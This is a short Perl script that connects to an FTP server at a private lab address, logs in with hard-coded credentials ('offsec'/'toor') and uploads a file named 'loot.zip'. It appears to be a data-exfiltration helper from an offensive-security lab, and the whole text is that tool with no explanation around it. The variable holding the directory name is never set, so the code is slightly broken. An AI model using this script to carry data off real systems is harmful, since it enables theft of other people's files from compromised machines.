use Net::FTP;
$ftp = Net::FTP->new("10.11.0.154", Debug => 1)
    or die "Cannot connect to hostname: $@";
$ftp->login("offsec", "toor")
    or die "Cannot login ", $ftp->message;
$ftp->cwd("/")
    or die "Cannot change working directory ", $ftp->message;
# create 'date named' directory on FTP server
$ftp->mkdir($dateDir);
$ftp->cwd($dateDir);
# set binary mode which is needed for image upload
$ftp->binary();
# upload the file
$ftp->put("loot.zip");   
$ftp->quit();
